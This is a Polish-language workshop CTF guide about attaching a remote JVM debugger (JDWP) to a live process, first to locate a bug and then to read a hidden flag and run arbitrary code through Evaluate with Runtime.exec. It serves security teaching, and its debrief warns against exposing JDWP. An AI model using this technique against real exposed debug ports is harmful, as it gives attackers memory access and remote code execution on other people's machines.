# Stacja 04 — Remote debug: znajdź bug, potem ukradnij sekret

**Technika:** podpięcie *Remote JVM Debug* (JDWP) do żywego procesu, breakpointy, *Evaluate*.
Jedna sesja debuggera, dwa etapy — od niewinnej diagnozy do pełnego przejęcia procesu.

**Cel dydaktyczny:** poczuć, że „podłączenie się do debugowania" cudzego procesu to
w rzeczywistości odczyt całej jego pamięci i wykonanie dowolnego kodu. Dlatego otwarty
JDWP nigdy nie wychodzi na świat.

## Zasady
- Ćwiczenie w kontrolowanym środowisku warsztatu, na serwerze do wyrzucenia.
- Dostajesz adres i porty od prowadzącego (HTTP `80xx`, JDWP `50xx`).

## Podłączenie debuggera
IntelliJ → *Run → Edit Configurations → + → Remote JVM Debug* → host `ADRES`, port `50xx`.
Jeśli JDWP jest tylko na loopbacku serwera, najpierw tunel:
```bash
ssh -N -L 50xx:localhost:50xx user@ADRES
```

## Etap 1 — znajdź bug (rozgrzewka)
Usługa `/sum` dla niektórych zapytań zwraca zły wynik:
```bash
curl "http://ADRES:80xx/sum?a=2&b=3"     # 5  (ok)
curl "http://ADRES:80xx/sum?a=2&b=-3"    # zły wynik
```
Nie masz logów aplikacyjnych. Ustaw breakpoint w `SecretServer.add(...)`, wyślij zapytanie
z ujemnym `b` i prześledź, w którą gałąź wchodzi wykonanie.

<details><summary>Podpowiedź</summary>

Dla `b < 0` jest osobna gałąź, która zamiast dodawania robi odejmowanie. Breakpoint
w `add()` pokaże to od razu.
</details>

## Etap 2 — ukradnij sekret (CTF)
Jesteś już wpięty w proces. Serwer chowa flagę i przez HTTP pokazuje tylko `FLAG{****}`
— ale debugger widzi więcej. Dwie drogi:

**A — odczyt pamięci:** zatrzymaj wykonanie (np. breakpoint w obsłudze żądania, potem
odśwież `/`) i w panelu *Variables* / *Evaluate* odczytaj stałą `SecretServer.FLAG`.

**B — dowolny kod (właściwa lekcja):** w *Evaluate* uruchom kod w procesie:
```java
System.getenv("WORKSHOP_FLAG")            // odczyt środowiska procesu
```
a żeby zobaczyć, że to pełne RCE, a nie tylko podgląd zmiennych:
```java
new java.io.BufferedReader(new java.io.InputStreamReader(
    Runtime.getRuntime().exec(new String[]{"id"}).getInputStream())).readLine()
```

Weryfikacja flagi:
```bash
curl "http://ADRES:80xx/verify?flag=FLAG{...twoja...}"   # ✅ / ❌
```

## Debrief (najważniejsza część)
- Ten sam nieszkodliwy dostęp, którym w etapie 1 szukałeś buga, w etapie 2 dał Ci
  **odczyt całej pamięci i wykonanie dowolnego kodu** — czyli praktycznie konto na
  maszynie. JDWP nie ma uwierzytelniania ani szyfrowania.
- Dlatego produkcyjnie debugger **nigdy** nie idzie na `address=0.0.0.0`. Zawsze
  `address=127.0.0.1` + tunel SSH, i tylko na czas diagnozy.
- „Ukrycie" sekretu w kodzie/API nie chroni przed kimś, kto jest już w procesie.

---

## Dla prowadzącego — postawienie N instancji
```bash
mvn -q -pl 04-jdwp-ctf -am package
cd 04-jdwp-ctf
./scale.sh 30 127.0.0.1     # lub 0.0.0.0 w zaufanym LAN
docker compose -f compose.scale.yaml up --build -d
```
Każda instancja: unikalna flaga + własne porty (HTTP `8081+`, JDWP `5006+`).
Podgląd flag: `docker compose -f compose.scale.yaml exec ctf-07 printenv WORKSHOP_FLAG`.
Po warsztacie: `docker compose -f compose.scale.yaml down` (i skasuj serwer, jeśli w chmurze).
Pełne wdrożenie w chmurze: patrz [`deploy/README.md`](../deploy/README.md).
